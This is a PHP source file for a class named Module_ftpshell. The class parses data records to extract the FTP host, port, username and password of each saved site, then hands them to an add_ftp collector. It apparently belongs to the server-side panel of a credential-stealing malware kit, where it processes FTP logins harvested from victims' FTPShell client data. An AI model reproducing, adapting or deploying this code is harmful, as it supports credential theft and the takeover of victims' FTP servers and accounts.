<?php

class Module_ftpshell extends Module_
{
    protected function ProcessFTPShell($Data)
    {
        if (strlen($Data) == 0)
            return;

        $Lines = parse_lines($Data);
        $State = 0;
        foreach ($Lines as $Line)
        {
            switch ($State)
            {
            case 0:
                if ($Line == '!~*NEWSITE*~!')
                {
                    $State = 1;
                    $Host = '';
                    $User = '';
                    $Port = '';
                }
                break;
            case 1:
                $State = 2;
                break;
            case 2:
                $Host = Assign_($Line);
                $State = 3;
                break;
            case 3:
                $Port =  Assign_($Line);
                $State = 4;
                break;
            case 4:
                $State = 5;
                break;
            case 5:
                $User =  Assign_($Line);
                $State = 6;
                break;
            case 6:
                $Pass =  Assign_($Line);

                $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);

                $State = 0;
                break;
            }
        }

    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessFTPShell($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
